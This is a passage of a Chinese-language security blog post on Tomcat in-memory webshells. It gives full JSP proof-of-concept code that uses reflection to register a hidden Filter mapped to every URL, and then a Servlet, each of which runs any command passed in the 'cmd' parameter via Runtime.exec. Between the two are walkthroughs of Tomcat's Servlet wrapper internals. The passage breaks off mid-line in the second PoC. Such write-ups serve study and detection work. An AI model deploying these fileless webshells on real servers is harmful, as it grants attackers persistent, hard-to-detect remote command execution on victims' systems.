title="完整POC"></a>完整POC</h4><p>Filter.jsp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//获取StandardContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> <span class="comment">//恶意Filter，主要是doFilter方法</span></span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//使用FilterDef封装filter</span></span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> <span class="comment">//创建filterMap，filterMap用于路由映射</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> <span class="comment">//反射封装filterConfig及filterDef到filterConfigs </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>先注册恶意Filter</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010440959.png"                      alt="image-20230201044023838"                ><figcaption>image-20230201044023838</figcaption></figure></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>先创建一个恶意Servlet</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException | NullPointerException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010555517.png"                      alt="image-20230201055527413"                ><figcaption>image-20230201055527413</figcaption></figure></p><p>接着需要实现动态注册Servlet</p><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><blockquote><p>Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收,也是接下来注册恶意Servlet的关键</p></blockquote><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">fireLifecycleEvent</span><span class="params">(String type, Object data)</span> &#123;</span><br><span class="line">        <span class="type">LifecycleEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LifecycleEvent</span>(<span class="built_in">this</span>, type, data);</span><br><span class="line">        <span class="keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;</span><br><span class="line">            listener.lifecycleEvent(event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p></blockquote><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="comment">//添加路径映射</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addServletMappingDecoded</span><span class="params">(String pattern, String name,</span></span><br><span class="line"><span class="params">                                  <span class="type">boolean</span> jspWildCard)</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Container child : findChildren()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!child.getState().isAvailable()) &#123;</span><br><span class="line">        child.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//判断属性loadOnStartup的值</span></span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">            list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            map.put(key, list);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();<span class="comment">//加载Servlet</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>最后的poc中需要注意<code>loadOnStartup</code>属性的设置，只有大于0才会被放入list，进而被加载<code>wrapper.load()</code></p></blockquote><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上面的分析可以总结流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>、<code>ServletName</code>、<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h4 id="完整POC链"><a href="#完整POC链" class="headerlink" title="完整POC链"></a>完整POC链</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//得到StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> <span class="comment">//恶意Servlet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//创建StandardWrapper并设置对应属性</span></span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);<span class="comment">//不能小于0</span></span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//绑定路由</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span 